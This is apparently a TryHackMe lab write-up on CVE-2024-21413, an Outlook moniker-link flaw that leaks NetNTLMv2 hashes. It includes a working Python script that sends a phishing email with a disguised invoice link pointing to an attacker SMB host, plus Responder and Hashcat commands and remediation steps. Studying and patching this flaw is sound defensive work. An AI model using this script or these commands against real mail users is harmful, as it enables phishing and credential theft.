# Moniker Link (CVE-2024-21413) — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Vulnerability_Research-blue.svg)
![CVE](https://img.shields.io/badge/CVE-2024--21413-critical.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete penetration testing writeup for the **Moniker Link (CVE-2024-21413)** room on TryHackMe, exploiting Microsoft Outlook Protected View bypass to harvest NetNTLMv2 hashes.

---

## 📋 Executive Summary
CVE-2024-21413 (dubbed "MonikerLink") is a critical vulnerability affecting Microsoft Outlook. The flaw allows remote attackers to bypass Outlook Protected View restrictions and Microsoft Office trust boundaries by crafting special hyperlinks using the `file://` URI moniker appended with exclamation point identifiers (`!`). When clicked, Outlook improperly parses the moniker, triggering an automated SMB connection that leaks the target user's NetNTLMv2 credentials to an attacker-controlled listener.

* **Target OS:** Windows
* **Vulnerability:** CVE-2024-21413 (Outlook Moniker Link Protected View Bypass)
* **Artifacts in Directory:**
  * `exploit.py`: Python SMTP exploit delivery script
  * `hash.txt`: Captured NetNTLMv2 authentication hash

---

## 🔍 Stage 1: Vulnerability Mechanics (CVE-2024-21413)

### 1.1 The Moniker Vulnerability
Microsoft Office uses the Component Object Model (COM) Moniker architecture to resolve linked external resources. Standard `file://` hyperlinks pointing to remote SMB shares typically trigger warning dialogs in Outlook.

However, appending an exclamation mark (`!`) followed by arbitrary text causes the COM parser to treat the link as an OLE moniker container:
```text
file://<ATTACKER_IP>/share/test!exploit
```
When Outlook processes this link, it bypasses security prompts and immediately issues an SMB `Negotiate Protocol` and `Session Setup` request to the remote server, transmitting the current Windows user's NetNTLMv2 challenge-response hash.

---

## 💥 Stage 2: Exploitation & Hash Harvesting

### 2.1 Setting Up the SMB Listener (Responder)
On the attacker machine, start Responder on interface `tun0`:
```bash
sudo responder -I tun0 -v
```

### 2.2 Delivering the Malicious Email (`exploit.py`)
We construct an HTML email containing the crafted moniker link and deliver it via the internal SMTP service on port 25:
```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm'
receiver_email = 'victim@monikerlink.thm'

html_content = '''<!DOCTYPE html>
<html>
    <body>
        <p><a href="file://192.168.144.172/test!exploit">Review Urgent Invoice</a></p>
    </body>
</html>'''

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413 Review"
message["From"] = formataddr(('Finance Department', sender_email))
message["To"] = receiver_email
message.attach(MIMEText(html_content, 'html'))

server = smtplib.SMTP('10.49.150.103', 25)
server.login(sender_email, "attacker_password")
server.sendmail(sender_email, [receiver_email], message.as_string())
server.quit()
```

### 2.3 Capturing & Cracking the Hash
When the recipient opens the email and clicks the hyperlink, Outlook initiates an SMB connection to our Responder listener, capturing the NetNTLMv2 hash in `hash.txt`:
```text
tryhackme::THM-MONIKERLINK:5a76e2e8d5c3de77:828763A302EFC49A...
```

Cracking the hash using Hashcat:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 🛡️ Remediation
1. **Apply Microsoft Security Updates:** Install official patches for CVE-2024-21413 issued in Microsoft's February 2024 Patch Tuesday.
2. **Block Outbound SMB (Port 445):** Block outbound traffic on port 445/tcp at perimeter firewalls to prevent internal NTLM credentials from leaking to external IP addresses.
3. **Disable NTLM:** Transition to Kerberos authentication and restrict NTLM SSP usage across Active Directory domains.
